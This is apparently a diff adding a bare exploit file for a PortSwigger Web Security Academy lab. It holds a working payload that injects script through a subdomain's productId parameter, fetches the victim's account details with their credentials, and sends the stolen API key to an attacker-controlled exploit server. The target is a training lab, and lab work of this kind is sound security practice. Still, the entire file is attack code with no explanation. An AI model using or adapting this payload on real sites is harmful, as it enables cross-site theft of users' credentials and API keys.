@@ -1,0 +1,9 @@
+<script>
+    var xss = "fetch('https://0a0a00b60411130081dd7044000c0005.web-security-academy.net/accountDetails', {'credentials': 'include'}).then(resp => resp.json()).then(data => data.apikey).then(key => {window.location.href = `https://exploit-0ad5005b04ce13f381cb6f2a01de00b6.exploit-server.net/exploit?${key}`})"
+
+ 
+
+     document.location = `http://stock.0a0a00b60411130081dd7044000c0005.web-security-academy.net/?productId=<script>${xss}<\/script>&storeId=2`
+  
+</script>
+
